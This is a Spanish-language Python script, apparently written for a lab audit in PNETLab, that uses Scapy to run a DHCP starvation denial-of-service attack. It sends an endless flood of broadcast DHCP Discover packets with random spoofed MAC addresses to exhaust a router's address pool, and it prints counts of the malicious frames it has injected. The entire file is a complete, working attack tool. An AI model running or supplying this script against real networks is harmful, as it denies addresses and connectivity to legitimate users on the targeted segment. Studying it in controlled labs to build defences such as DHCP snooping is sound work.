#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Auditoría de Capa 2: Denegación de Servicio (DoS) mediante DHCP Starvation
Entorno de Pruebas: PNETLab / VMware Workstation
Subred Objetivo: VLAN 66 (Pool del Router: 202.121.66.0/24)
"""

import sys
import os
import time
from scapy.all import *

def ejecutar_dhcp_starvation(interfaz):
    print(f"\n[+] Iniciando tormenta de peticiones DHCP Discover (Starvation)...")
    print(f"[+] Inyectando tráfico malicioso a través de la interfaz: {interfaz}")
    print("[+] Presiona CTRL+C para detener el ataque.\n")
    
    contador = 0
    try:
        while True:
            # 1. Generar una dirección MAC aleatoria única por cada ciclo
            mac_falsa = RandMAC()
            
            # 2. Convertir la MAC generada a bytes binarios crudos para inyectarla en el campo CHADDR (Capa 7 BOOTP)
            # CHADDR requiere un campo fijo de 16 bytes (6 bytes de la MAC + 10 bytes de relleno/padding a cero)
            mac_bytes = mac2str(mac_falsa)
            chaddr_campo = mac_bytes + b"\x00" * 10
            
            # 3. Construcción del paquete de transmisión masiva (Broadcast)
            # Capa 2 y Capa 3 configuradas en difusión global
            capa_l2_l3 = Ether(src=mac_falsa, dst="ff:ff:ff:ff:ff:ff") / \
                         IP(src="0.0.0.0", dst="255.255.255.255") / \
                         UDP(sport=68, dport=67)
            
            # Capa BOOTP (Bootstrap Protocol): op=1 indica mensaje de solicitud (Boot Request)
            # Se asigna un identificador de transacción aleatorio (xid) y la MAC falsa en chaddr
            capa_bootp = BOOTP(op=1, xid=random.randint(1, 100000000), chaddr=chaddr_campo)
            
            # Capa DHCP: Definición del tipo de mensaje como "discover"
            capa_dhcp = DHCP(options=[("message-type", "discover"), "end"])
            
            # Ensamblaje final de la trama maliciosa
            trama_completa = capa_l2_l3 / capa_bootp / capa_dhcp
            
            # 4. Inyección de la trama en el cable virtual de PNETLab
            sendp(trama_completa, iface=interfaz, verbose=False)
            
            contador += 1
            if contador % 200 == 0:
                print(f"[➔] {contador} peticiones DHCP Discover falsas inyectadas en la red.")
                
    except KeyboardInterrupt:
        print(f"\n[-] Ataque detenido por el operador.")
        print(f"[+] Total de peticiones transmitidas al pool: {contador}")
        sys.exit(0)

if __name__ == "__main__":
    # Validar parámetros de la línea de comandos
    if len(sys.argv) != 2:
        print("[-] Uso incorrecto del script.")
        print("[-] Sintaxis: sudo python3 dhcp_starvation.py <interfaz_local>")
        print("[-] Ejemplo:  sudo python3 dhcp_starvation.py e0")
        sys.exit(1)
        
    interfaz_red = sys.argv[1]
    
    # Validar privilegios elevados de Root
    if os.getuid() != 0:
        print("[-] Error Crítico: Se requieren privilegios de ROOT (sudo) para manipular sockets crudos de red.")
        sys.exit(1)
        
    ejecutar_dhcp_starvation(interfaz_red)